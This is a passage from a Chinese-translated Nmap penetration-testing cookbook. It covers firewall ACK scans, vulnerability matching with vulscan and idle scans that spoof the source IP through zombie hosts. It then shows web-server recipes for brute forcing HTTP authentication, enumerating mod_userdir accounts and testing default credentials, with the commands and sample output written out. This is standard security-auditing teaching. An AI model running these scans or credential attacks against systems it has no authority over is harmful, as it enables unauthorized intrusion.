1.  如果没有返回响应，或者返回 ICMP 错误消息，我们可以确定主机是否被防火墙保护。

## 还有更多...

重要的是要记住，这种技术不能区分开放和关闭的端口。它主要用于识别保护主机的数据包过滤系统。

这种扫描技术可以与 Nmap 选项`--badsum`结合使用，以提高检测防火墙或 IPS 的概率。不能正确计算校验和的数据包过滤系统将返回 ICMP 目的地不可达错误，从而暴露出它们的存在。

可以使用标志`-p`、`-p[1-65535]`或`-p-`来设置端口范围：

```
$nmap -sA -p80 <target>
$nmap -sA -p1-100 <target>
$nmap -sA -p- <target>

```

### 端口状态

Nmap 使用以下状态对端口进行分类：

+   `打开`：表示应用程序正在监听该端口上的连接。

+   `关闭`：表示已接收到探测包，但在该端口上没有应用程序在监听。

+   `过滤`：表示未收到探测包，并且无法建立状态。它还表示探测包正在被某种过滤器丢弃。

+   `未过滤`：表示已接收到探测包，但无法建立状态。

+   `开放/过滤`：表示 Nmap 无法确定端口是被过滤还是开放的。

+   `关闭/过滤`：表示 Nmap 无法确定端口是被过滤还是关闭的。

## 另请参阅

+   *指纹识别主机操作系统*食谱

+   *发现指向同一 IP 地址的主机名*食谱

+   *检查主机是否已知存在恶意活动*食谱

+   *列出远程主机支持的协议*食谱

+   *匹配已知安全漏洞的服务*食谱

+   *欺骗端口扫描的源 IP*食谱

+   *暴力破解 DNS 记录*食谱

+   *发现 UDP 服务*食谱

# 匹配已知安全漏洞的服务

版本发现对于渗透测试人员至关重要，因为他们可以利用这些信息来查找影响扫描服务的公共安全漏洞。Nmap 脚本引擎允许我们将流行的 OSVDB 漏洞数据库与我们扫描中发现的服务进行匹配。

这个食谱展示了如何列出`osvdb`数据库中已知的安全漏洞，这些漏洞可能会影响使用 Nmap 发现的服务。

## 准备工作

为了完成这项任务，我们使用了 Marc Ruef 开发的 NSE 脚本`vulscan`。这个脚本没有包含在官方的 Nmap 存储库中，所以在继续之前，你需要单独安装它。

要安装它，请从[`www.computec.ch/mruef/?s=software&l=e`](http://www.computec.ch/mruef/?s=software&l=e)下载最新版本的`vulscan`。

提取文件后，将脚本`vulscan.nse`复制到本地脚本文件夹`($NMAP_INSTALLATION/scripts/`)中。然后在同一目录中创建一个名为`vulscan`的文件夹，并将`osvdb`数据库文件`object_products.txt`、`object_correlations.txt`、`object_links.txt`和`vulnerabilities.txt`放入其中。

要更新脚本数据库，请运行以下命令：

```
#nmap --script-updatedb

```

## 如何做...

打开终端并输入以下命令：

```
#nmap -sV --script vulscan <target>

```

脚本`vulscan`将在发现每个服务后包含匹配的记录：

```
# nmap -sV --script vulscan.nse meil.0xdeadbeefcafe.com -PS80

Nmap scan report for meil.0xdeadbeefcafe.com (106.187.35.219)
Host is up (0.20s latency).
Not shown: 995 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  closed http
113/tcp closed ident
465/tcp open   ssl/smtp Postfix smtpd
| vulscan: [1991] Postfix SMTP Log DoS
| [6551] Postfix Bounce Scan / Packet Amplification DDoS
| [10544] Postfix Malformed Envelope Address nqmgr DoS
| [10545] Postfix Multiple Mail Header SMTP listener DoS
| [13470] Postfix IPv6 Patch if_inet6 Failure Arbitrary Mail Relay
| [47658] Postfix Hardlink to Symlink Mailspool Arbitrary Content Append
| [47659] Postfix Cross-user Filename Local Mail Interception
| [48108] Postfix epoll File Descriptor Leak Local DoS
| [74515] Dovecot script-login chroot Configuration Setting Traversal Arbitrary File Access

```

## 它是如何工作的...

在上一个命令中，标志`-sV`启用了服务检测，参数`--script vulscan`启动了 NSE 脚本`vulscan`。

网站[osvdb.org](http://osvdb.org)是由 HD Moore 和 Forrest Rae 创建的开源漏洞数据库。脚本`vulscan`解析每个服务名称和版本，并将其与[osvdb.org](http://osvdb.org)上的`vulnerability`数据库的本地副本进行比较。

这种方法远非完美，因为`vulscan`的名称匹配仍然存在一些错误，并且我们也依赖于 Nmap 的版本检测。但是，它仍然非常有用，可以找到可能影响扫描服务的公共漏洞。

## 还有更多...

要更新本地的`osvdb`数据库副本，请访问[osvdb.org](http://osvdb.org)，获取最新的 CSV 导出文件，并替换`/scripts/vulscan/`中的文件。

## 另请参阅

+   *指纹识别主机操作系统*食谱

+   *收集有效的电子邮件账户*食谱

+   *发现指向同一 IP 地址的主机名*食谱

+   *列出远程主机支持的协议*食谱

+   *欺骗端口扫描的源 IP*食谱

+   *暴力破解 DNS 记录*食谱

+   *发现 UDP 服务*食谱

# 欺骗端口扫描的源 IP

*空闲扫描*是一种非常强大的技术，Nmap 利用一个具有可预测 IP ID 序列号的空闲主机来伪造端口扫描的源 IP。

这个食谱说明了如何找到僵尸主机，并在使用 Nmap 扫描远程主机时使用它们来伪造你的 IP 地址。

## 准备工作

要启动空闲扫描，我们需要一个*僵尸主机*。僵尸主机是具有可预测的 IP ID 序列号的机器，将用作伪造的 IP 地址。一个好的候选主机不应该与其他主机通信，以保持正确的 IP ID 序列号并避免误报。

要查找具有增量 IP ID 序列的主机，可以使用以下脚本`ipidseq`：

```
#nmap -p80 --script ipidseq <your ip>/24
#nmap -p80 --script ipidseq -iR 1000

```

可能的候选者将在脚本的输出部分返回文本“增量”：

```
Host is up (0.28s latency).
PORT   STATE SERVICE
80/tcp open  http

Host script results:
|_ipidseq: Incremental!

```

## 操作方法...

要启动空闲扫描，打开终端并输入以下命令：

```
#nmap -Pn -sI <zombie host> <target>

```

输出将类似于以下内容：

```
Idle scan using zombie 93.88.107.55 (93.88.107.55:80); Class: Incremental
Nmap scan report for meil.0xdeadbeefcafe.com (106.187.35.219)
Host is up (0.67s latency).
Not shown: 98 closed|filtered ports
PORT    STATE SERVICE
465/tcp open  smtps
993/tcp open  imaps

```

如果僵尸主机符合先前讨论的要求，空闲扫描应该可以工作。如果某些情况不如预期，返回的错误消息应该让你知道出了什么问题：

```
Idle scan zombie XXX.XXX.XX.XX (XXX.XXX.XX.XX) port 80 cannot be used because it has not returned any of our probes -- perhaps it is down or firewalled.
QUITTING!
Idle scan zombie 0xdeadbeefcafe.com (50.116.1.121) port 80 cannot be used because IP ID sequencability class is: All zeros.  Try another proxy.
QUITTING!

```

## 工作原理...

空闲扫描最初是由 Salvatore Sanfilipo（`hping`的作者）在 1998 年发现的。这是一种巧妙而非常隐秘的扫描技术，其中源 IP 被伪造，通过伪造数据包和分析空闲主机（通常称为僵尸主机）的 IP ID 序列号来实现。

标志`-sI <zombie>`用于告诉 Nmap 使用`<zombie>`作为源 IP 发起空闲端口扫描。空闲扫描的工作方式如下：

1.  Nmap 确定僵尸主机的 IP ID 序列。

1.  Nmap 向目标发送伪造的 SYN 数据包，就好像它是由僵尸主机发送的一样。

1.  如果端口是打开的，目标会向僵尸主机发送一个 SYN/ACK 数据包，并增加其 IP ID 序列号。

1.  Nmap 分析僵尸的 IP ID 序列号的增量，以确定是否从目标接收到 SYN/ACK 数据包，并确定端口状态。

## 还有更多...

与僵尸主机通信的其他主机会增加其 IP ID 序列号，导致扫描中出现误报。因此，这种技术只有在僵尸主机处于空闲状态时才有效。因此，正确选择非常重要。

还很重要的是，你要找出你的 ISP 是否在主动过滤伪造的数据包。许多 ISP 今天会阻止甚至修改伪造的数据包，用你的真实 IP 地址替换伪造的地址，使得这种技术对目标来说毫无用处。不幸的是，Nmap 无法检测到这种情况，这可能会导致你认为你在扫描一个没有留下任何痕迹的主机，而实际上你的所有数据包都发送了你的真实 IP 地址。

### IP ID 序列号

IP 头中的 ID 字段主要用于跟踪数据包以便重新组装，但由于许多系统以不同的方式实现了这个数字，因此安全爱好者已经使用它来对这些系统进行指纹识别、分析和收集信息。

家用路由器、打印机、IP 网络摄像头和原始设备通常使用增量 IP ID 序列号，并且非常适合用作僵尸主机。它们通常大部分时间处于空闲状态，这是空闲扫描的一个重要要求。要找出主机是否具有增量 IP ID 序列，有两种选择：

+   使用 OS 检测的详细模式。

```
#nmap -sV -v -O <target>

```

+   使用 Kriss Katterjon 的`ipidseq` NSE 脚本。

```
$nmap -p80 --script ipidseq <target>

```

## 另请参阅

+   指纹识别主机的操作系统的方法

+   发现指向相同 IP 地址的主机名的方法

+   检查主机是否因恶意活动而闻名的方法

+   列出远程主机支持的协议的方法

+   与已知安全漏洞的服务进行匹配的方法

+   暴力破解 DNS 记录的方法

+   使用 TCP ACK 扫描发现有状态防火墙的方法


# 第四章：审核 Web 服务器

### 注意

本章向您展示了如何做一些在许多情况下可能是非法、不道德、违反服务条款或不明智的事情。它在这里提供是为了给您提供可能有用的信息，以保护自己免受威胁，并使自己的系统更安全。在遵循这些说明之前，请确保您站在法律和道德的一边...善用您的力量！

在本章中，我们将涵盖：

+   列出支持的 HTTP 方法

+   检查 HTTP 代理是否开放

+   在各种 Web 服务器上发现有趣的文件和目录

+   暴力破解 HTTP 身份验证

+   滥用 mod_userdir 列举用户帐户

+   测试 Web 应用程序中的默认凭据

+   暴力破解 WordPress 安装的密码审核

+   暴力破解 Joomla！安装的密码审核

+   检测 Web 应用程序防火墙

+   检测可能的 XST 漏洞

+   检测 Web 应用程序中的跨站脚本漏洞

+   在 Web 应用程序中查找 SQL 注入漏洞

+   检测易受 slowloris 拒绝服务攻击的 Web 服务器

# 介绍

**超文本传输协议（HTTP）**可以说是当今最流行的协议之一。Web 服务器已经从提供静态页面转变为处理具有实际用户交互的复杂 Web 应用程序。这打开了一个门，使得可能存在有害用户输入，可能改变应用程序的逻辑以执行意外操作。现代 Web 开发框架允许几乎任何具有编程知识的人在几分钟内制作 Web 应用程序，但这也导致了互联网上易受攻击应用程序的增加。Nmap 脚本引擎的可用 HTTP 脚本数量迅速增长，Nmap 变成了一款宝贵的 Web 扫描器，帮助渗透测试人员以自动化方式执行许多繁琐的手动检查。它不仅可以用于查找易受攻击的 Web 应用程序或检测错误的配置设置，而且由于新的蜘蛛库，Nmap 甚至可以爬行 Web 服务器，寻找各种有趣的信息。

本章介绍了使用 Nmap 对 Web 服务器进行审核，从自动化配置检查到利用易受攻击的 Web 应用程序。我将介绍我在过去一年中开发的一些 NSE 脚本，以及我在 Websec 进行 Web 渗透测试时每天使用的脚本。本章涵盖了检测数据包过滤系统、暴力破解密码审核、文件和目录发现以及漏洞利用等任务。

# 列出支持的 HTTP 方法

Web 服务器根据其配置和软件支持不同的 HTTP 方法，其中一些在特定条件下可能是危险的。渗透测试人员需要一种快速列出可用方法的方法。NSE 脚本`http-methods`不仅允许他们列出这些潜在危险的方法，还允许他们进行测试。

本教程向您展示如何使用 Nmap 枚举 Web 服务器支持的所有 HTTP 方法。

## 如何做...

打开终端并输入以下命令：

```
$ nmap -p80,443 --script http-methods scanme.nmap.org

```

对于在端口`80`或`443`上检测到的每个 Web 服务器，都显示了结果：

```
Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.11s latency).
PORT    STATE  SERVICE
80/tcp  open   http
|_http-methods: GET HEAD POST OPTIONS
443/tcp closed https

```

## 工作原理...

参数`-p80,443 --script http-methods`使 Nmap 在发现端口 80 或 443（`-p80,443`）的 Web 服务器时启动`http-methods`脚本。NSE 脚本`hhttp-methods`由 Bernd Stroessenreuther 提交，并使用 HTTP 方法`OPTIONS`尝试列出 Web 服务器支持的所有方法。

`OPTIONS`在 Web 服务器中用于通知客户端其支持的方法。请记住，此方法不考虑配置或防火墙规则，并且通过`OPTIONS`列出的方法并不一定意味着它对您是可访问的。

## 还有更多...

要单独检查`OPTIONS`返回的方法的状态代码响应，请使用脚本参数`http-methods.retest`：

```
# nmap -p80,443 --script http-methods --script-args http-methods.retest scanme.nmap.org
Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.14s latency).
PORT    STATE  SERVICE
80/tcp  open   http
| http-methods: GET HEAD POST OPTIONS
| GET / -> HTTP/1.1 200 OK
|
| HEAD / -> HTTP/1.1 200 OK
|
| POST / -> HTTP/1.1 200 OK
|
|_OPTIONS / -> HTTP/1.1 200 OK
443/tcp closed https

```

默认情况下，脚本`http-methods`使用根文件夹作为基本路径（`/`）。如果要设置不同的基本路径，请设置参数`http-methods.url-path`：

```
# nmap -p80,443 --script http-methods --script-args http-methods.url-path=/mypath/ scanme.nmap.org

```

### 有趣的 HTTP 方法

`TRACE`，`CONNECT`，`PUT`和`DELETE`这些 HTTP 方法可能存在安全风险，如果 Web 服务器或应用程序支持，需要进行彻底测试。

`TRACE`使应用程序容易受到**跨站点跟踪（XST）**攻击的影响，并可能导致攻击者访问标记为`httpOnly`的 cookie。`CONNECT`方法可能允许 Web 服务器用作未经授权的 Web 代理。`PUT`和`DELETE`方法具有更改文件夹内容的能力，如果权限设置不正确，显然会被滥用。

您可以在[`www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29`](http://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29)了解与每种方法相关的常见风险。

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 默认的 HTTP 用户代理的请求。您可以通过设置参数`http.useragent`来使用不同的 HTTP 用户代理：

```
$ nmap -p80 --script http-methods --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 流水线

一些 Web 服务器允许将多个 HTTP 请求封装在单个数据包中。这可能会加快执行 NSE HTTP 脚本，并建议在 Web 服务器支持的情况下使用。默认情况下，HTTP 库尝试对 40 个请求进行流水线处理，并根据`Keep-Alive`标头根据流量条件自动调整请求的数量。

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到流水线的 HTTP 请求的最大数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*配方

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *检测 Web 应用程序防火墙*配方

+   *滥用 mod_userdir 列举用户帐户*配方

+   *测试 Web 应用程序中的默认凭据*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 检查 HTTP 代理是否开放

HTTP 代理用于通过它们的地址发出请求，因此可以隐藏我们的真实 IP 地址。如果您是需要保持网络安全的系统管理员，或者是伪装自己真实来源的攻击者，检测它们是很重要的。

此配方向您展示了如何使用 Nmap 检测开放的 HTTP 代理。

## 如何操作...

打开终端并输入以下命令：

```
$ nmap --script http-open-proxy -p8080 <target>

```

结果包括成功测试的 HTTP 方法：

```
PORT     STATE SERVICE
8080/tcp open  http-proxy
|  proxy-open-http: Potentially OPEN proxy.
|_ Methods successfully tested: GET HEAD CONNECT

```

## 它是如何工作的...

我们使用参数`--script http-open-proxy -p8080`来启动 NSE 脚本`http-open-proxy`，如果在端口`8080`上发现运行的 Web 服务器，这是 HTTP 代理的常见端口。

NSE 脚本`http-open-proxy`由 Arturo“Buanzo”Busleiman 提交，它旨在检测开放代理，正如其名称所示。默认情况下，它请求[google.com](http://google.com)，[wikipedia.org](http://wikipedia.org)和[computerhistory.org](http://computerhistory.org)，并寻找已知的文本模式，以确定目标 Web 服务器上是否运行着开放的 HTTP 代理。

## 还有更多...

您可以通过使用脚本参数`http-open-proxy.url`和`http-open-proxy.pattern`请求不同的 URL，并指定在连接成功时将返回的模式：

```
$ nmap --script http-open-proxy –script-args http-open-proxy.url=http://whatsmyip.org,http-open-proxy.pattern="Your IP address is" -p8080 <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 默认的 HTTP 用户代理的请求。您可以通过设置参数`http.useragent`来使用不同的 HTTP 用户代理：

```
$ nmap -p80 --script http-trace --script-args http.useragent="Mozilla 42" <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*配方

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *检测 Web 应用程序防火墙*配方

+   *暴力破解 HTTP 身份验证*配方

+   *滥用 mod_userdir 枚举用户帐户*配方

+   *测试 Web 应用程序中的默认凭据*配方

+   *暴力破解密码审计 WordPress 安装*配方

+   *暴力破解密码审计 Joomla！安装*配方

+   *在 Web 应用程序中查找 SQL 注入漏洞*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 在各种 Web 服务器上发现有趣的文件和目录

渗透测试中的常见任务之一是无法手动完成的文件和目录发现。有几种工具专门用于此任务，但 Nmap 真正闪耀的是其强大的数据库，其中包括有趣的文件，如 README，数据库转储和遗忘的配置备份；常见目录，如管理面板或未受保护的文件上传者；甚至攻击有效载荷，以利用常见的易受攻击的 Web 应用程序中的目录遍历。

这个配方将向您展示如何使用 Nmap 进行 Web 扫描，以发现有趣的文件，目录，甚至是存在漏洞的 Web 应用程序。

## 如何操作...

打开您的终端并输入以下命令：

```
$ nmap --script http-enum -p80 <target>

```

结果将包括所有有趣的文件，目录和应用程序：

```
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /blog/: Blog
|   /test.php: Test page
|   /robots.txt: Robots file
|   /css/cake.generic.css: CakePHP application
|_  /img/cake.icon.png: CakePHP application

```

## 它是如何工作的...

使用参数`-p80 --script http-enum`告诉 Nmap 在端口 80 上找到 Web 服务器时启动脚本`http-enum`。脚本`http-enum`最初是由 Ron Bowes 提交的，其主要目的是进行目录发现，但社区一直在添加新的指纹以包括其他有趣的文件，如版本文件，README 和遗忘的数据库备份。我还添加了超过 150 个条目，用于识别过去两年中存在漏洞的 Web 应用程序，新条目不断添加。

```
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /crossdomain.xml: Adobe Flash crossdomain policy

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /home.html: Possible admin folder
|   /test/: Test page
|   /logs/: Logs
|_  /robots.txt: Robots file

```

## 还有更多...

指纹存储在`/nselib/data/`中的文件`http-fingerprints.lua`中，它们实际上是 LUA 表。一个条目看起来像下面这样：

```
table.insert(fingerprints, {
	category='cms',
	probes={
		{path='/changelog.txt'},
		{path='/tinymce/changelog.txt'},
	},
	matches={
		{match='Version (.-) ', output='Version \\1'},
		{output='Interesting, a changelog.'}
	}
})
```

您可以向此文件添加自己的条目，或者使用参数`http-enum.fingerprintfile`来使用不同的指纹文件：

```
$ nmap --script http-enum --script-args http-enum.fingerprintfile=./myfingerprints.txt -p80 <target>

```

默认情况下，`http-enum`使用根目录作为基本路径。要设置不同的基本路径，请使用脚本参数`http-enum.basepath`：

```
$ nmap --script http-enum http-enum.basepath=/web/ -p80 <target>

```

要显示所有返回可能指示存在页面的状态代码的条目，请使用脚本参数`http-enum.displayall`：

```
$ nmap --script http-enum http-enum.displayall -p80 <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的 HTTP 用户代理：

```
$ nmap -p80 --script http-enum --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 流水线处理

一些 Web 服务器允许在单个数据包中封装多个 HTTP 请求。这可能加快执行 NSE HTTP 脚本，并建议在 Web 服务器支持时使用。HTTP 库默认尝试对 40 个请求进行流水线处理，并根据`Keep-Alive`标头根据流量条件自动调整该数字。

```
$ nmap -p80 --script http-enum --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到流水线的 HTTP 请求的最大数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$.nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *暴力破解 HTTP 身份验证*配方

+   *滥用 mod_userdir 枚举用户帐户*配方

+   *测试 Web 应用程序中的默认凭据*配方

+   *暴力破解密码审计 WordPress 安装*配方

+   *暴力破解密码审计 Joomla！安装*配方

# 暴力破解 HTTP 身份验证

许多家用路由器，IP 网络摄像头，甚至 Web 应用程序仍然依赖 HTTP 身份验证，渗透测试人员需要尝试使用弱密码字典来确保系统或用户帐户的安全。现在，由于 NSE 脚本`http-brute`，我们可以对 HTTPAuth 受保护的资源执行强大的字典攻击。

此配方展示了如何对使用 HTTP 身份验证的 Web 服务器执行暴力破解密码审计。

## 如何做...

使用以下 Nmap 命令对受 HTTP 基本身份验证保护的资源执行暴力破解密码审计：

```
$ nmap -p80 --script http-brute –script-args http-brute.path=/admin/ <target>

```

结果包含找到的所有有效帐户：

```
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack
| http-brute: 
|   Accounts
|     admin:secret => Valid credentials
|   Statistics
|_    Perfomed 603 guesses in 7 seconds, average tps: 86

```

## 它是如何工作的...

参数`-p80 --script http-brute`告诉 Nmap 在端口 80 上运行的 Web 服务器上启动`http-brute`脚本。此脚本最初由 Patrik Karlsson 提交，并且是为了对受 HTTP 基本身份验证保护的 URI 进行字典攻击而创建的。

脚本`http-brute`默认使用位于`/nselib/data/`的文件`usernames.lst`和`passwords.lst`尝试每个用户的每个密码，以便找到有效帐户。

## 还有更多...

脚本`http-brute`依赖于 NSE 库`unpwdb`和`brute`。这些库有几个脚本参数，可用于调整暴力破解密码的审计。

要使用不同的用户名和密码列表，请设置参数`userdb`和`passdb`：

```
$ nmap -p80 --script http-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt <target>

```

要在找到一个有效帐户后退出，请使用参数`brute.firstOnly`：

```
$ nmap -p80 --script http-brute --script-args brute.firstOnly <target>

```

默认情况下，`http-brute`使用 Nmap 的时间模板来设置以下超时限制：

+   -T3，T2，T1：10 分钟

+   -T4：5 分钟

+   -T5：3 分钟

要设置不同的超时限制，请使用参数`unpwd.timelimit`。要无限期运行，请将其设置为`0`：

```
$ nmap -p80 --script http-brute --script-args unpwdb.timelimit=0 <target>
$ nmap -p80 --script http-brute --script-args unpwdb.timelimit=60m <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-brute --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 流水线

一些 Web 服务器允许将多个 HTTP 请求封装在单个数据包中。这可能加快执行 NSE HTTP 脚本，并建议在 Web 服务器支持的情况下使用。默认情况下，HTTP 库尝试对 40 个请求进行流水线处理，并根据`Keep-Alive`头部根据流量情况自动调整该数字。

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到流水线中的 HTTP 请求的最大数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$.nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

### 暴力模式

暴力库支持不同的模式，可以改变攻击中使用的组合。可用的模式包括：

+   `user`：在此模式下，对于`userdb`中列出的每个用户，将尝试`passdb`中的每个密码。

```
$ nmap --script http-brute --script-args brute.mode=user <target>

```

+   `pass`：在此模式下，对于`passdb`中列出的每个密码，将尝试`usedb`中的每个用户。

```
$ nmap --script http-brute --script-args brute.mode=pass <target>

```

+   `creds`：此模式需要额外的参数`brute.credfile`。

```
$ nmap --script http-brute --script-args brute.mode=creds,brute.credfile=./creds.txt <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*配方

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *检测 Web 应用程序防火墙*配方

+   *滥用 mod_userdir 列举用户帐户*配方

+   *测试 Web 应用程序中的默认凭据*配方

+   *暴力破解密码审计 WordPress 安装*配方

+   *暴力破解密码审计 Joomla！安装*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 滥用 mod_userdir 列举用户帐户

Apache 的模块`UserDir`通过使用`/~username/`的 URI 语法提供对用户目录的访问。使用 Nmap，我们可以执行字典攻击并确定 Web 服务器上有效用户名的列表。

这个配方向您展示了如何使用 Nmap 对 Apache Web 服务器中启用`mod_userdir`的用户帐户进行暴力破解攻击。

## 如何做...

要尝试在启用`mod_userdir`的 Web 服务器中枚举有效用户，请使用 Nmap 和这些参数：

```
$ nmap -p80 --script http-userdir-enum <target>

```

找到的所有用户名将包含在结果中：

```
PORT   STATE SERVICE
80/tcp open  http
|_http-userdir-enum: Potential Users: root, web, test

```

## 它是如何工作的...

参数`-p80 --script http-userdir-enum`如果在端口 80（`-p80`）上找到 Web 服务器，则启动 NSE 脚本`http-userdir-enum`。带有`mod_userdir`的 Apache Web 服务器允许通过使用 URI（例如[`domain.com/~root/`](http://domain.com/~root/)）访问用户目录，此脚本帮助我们执行字典攻击以枚举有效用户。

首先，脚本查询一个不存在的目录以记录无效页面的状态响应。然后尝试字典文件中的每个单词，测试 URI 并寻找 HTTP 状态码 200 或 403，这将表明有效的用户名。

## 还有更多...

脚本`http-userdir-enum`默认使用位于`/nselib/data/`的单词列表`usernames.lst`，但您可以通过设置参数`userdir.users`来使用不同的文件，如下面的命令所示：

```
$ nmap -p80 --script http-userdir-enum --script-args userdir.users=./users.txt <target>
PORT   STATE SERVICE
80/tcp open  http
|_http-userdir-enum: Potential Users: john, carlos

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-brute --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 管线

一些 Web 服务器允许在单个数据包中封装多个 HTTP 请求。这可能加快 NSE HTTP 脚本的执行速度，如果 Web 服务器支持，建议使用它。默认情况下，HTTP 库尝试将 40 个请求进行管线处理，并根据`Keep-Alive`标头根据流量条件自动调整该数字。

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

另外，您可以使用参数`http.max-pipeline`来设置要添加到管道中的最大 HTTP 请求数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$.nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *检测 Web 应用程序防火墙*配方

+   *Brute forcing HTTP authentication*配方

+   *在 Web 应用程序中测试默认凭据*配方

+   *Brute-force 密码审计 WordPress 安装*配方

+   *Brute-force 密码审计 Joomla！安装*配方

# 在 Web 应用程序中测试默认凭据

在 Web 应用程序和设备中经常忘记默认凭据。 Nmap 的 NSE 脚本`http-default-accounts`自动化了测试流行 Web 应用程序（例如 Apache Tomcat Manager，Cacti 甚至家用路由器的 Web 管理界面）的默认凭据的过程。

此配方向您展示了如何使用 Nmap 自动测试多个 Web 应用程序中的默认凭据访问。

## 如何做...

要自动测试支持的应用程序中的默认凭据访问，请使用以下 Nmap 命令：

```
$ nmap -p80 --script http-default-accounts <target>

```

结果将指示应用程序和默认凭据（如果成功）：

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
|_http-default-accounts: [Cacti] credentials found -> admin:admin Path:/cacti/

```

## 工作原理...

如果在端口 80（`-p80`）上找到 Web 服务器，则启动 NSE 脚本`http-default-accounts`（`--script http-default-accounts`）。

我开发了这个 NSE 脚本，以节省在 Web 渗透测试期间的时间，通过自动检查系统管理员是否忘记在其系统中更改任何默认密码。我已经为流行服务包含了一些指纹，但是通过支持更多服务，这个脚本可以得到很大的改进。如果您可以访问通常使用默认凭据访问的服务，我鼓励您向其数据库提交新的指纹。到目前为止，支持的服务有：

+   仙人掌

+   Apache Tomcat

+   Apache Axis2

+   Arris 2307 路由器

+   思科 2811 路由器

该脚本通过查看已知路径并使用存储的默认凭据启动登录例程来检测 Web 应用程序。它依赖于位于`/nselib/data/http-default-accounts.nse`的指纹文件。条目是 LUA 表，看起来像下面这样：

```
table.insert(fingerprints, {
  name = "Apache Tomcat",
  category = "web",
  paths = {
    {path = "/manager/html/"},
    {path = "/tomcat/manager/html/"}
  },
  login_combos = {
    {username = "tomcat", password = "tomcat"},
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_basic_login(host, port, path, user, pass)
  end
})
```

每个指纹条目必须具有以下字段：

+   `name`：此字段指定描述性服务名称。

+   `category`：此字段指定较不侵入式扫描所需的类别。

+   `login_combos`：此字段指定服务使用的默认凭据的 LUA 表。

+   `paths`：此字段指定服务通常被发现的路径的 LUA 表。

+   `login_check`：此字段指定 Web 服务的登录例程。

## 还有更多...

为了减少侵入式扫描，可以使用脚本参数`http-default-accounts.category`按类别过滤探针：

```
$ nmap -p80 --script http-default-accounts --script-args http-default-accounts.category=routers <target>

```

可用的类别有：

+   `web`：此类别管理 Web 应用程序

+   `router`：此类别管理路由器的接口

+   `voip`：此类别管理 VOIP 设备

+   `security`：此类别管理与安全相关的软件

此脚本默认使用根文件夹作为基本路径，但您可以使用参数`http-default-accounts.basepath`设置不同的路径：

```
$ nmap -p80 --script http-default-accounts --script-args http-default-accounts.basepath=/web/ <target>

```

默认指纹文件位于`/nselib/data/http-default-accounts-fingerprints.lua`，但您可以通过指定参数`http-default-accounts.fingerprintfile`来使用不同的文件：

```
$ nmap -p80 --script http-default-accounts --script-args http-default-accounts.fingerprintfile=./more-signatures.txt <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-brute --script-args http.useragent="Mozilla 42" <target>

```

## 另请参阅

+   检测可能的 XST 漏洞食谱

+   在各种 Web 服务器上发现有趣的文件和目录的食谱

+   检测 Web 应用防火墙食谱

+   暴力破解 HTTP 身份验证食谱

+   滥用 mod_userdir 列举用户帐户的食谱

+   暴力破解密码审计 WordPress 安装食谱

+   暴力破解密码审计 Joomla！安装食谱

+   在 Web 应用程序中查找 SQL 注入漏洞的食谱

# 暴力破解密码审计 WordPress 安装

WordPress 是一个广为人知的**CMS**（**内容管理系统**），在许多行业中都有使用。Nmap 现在包括自己的 NSE 脚本，以帮助渗透测试人员发动字典攻击，并找到使用弱密码的帐户，这可能会危及应用程序的完整性。

此食谱显示了如何对 WordPress 安装执行暴力破解密码审计。

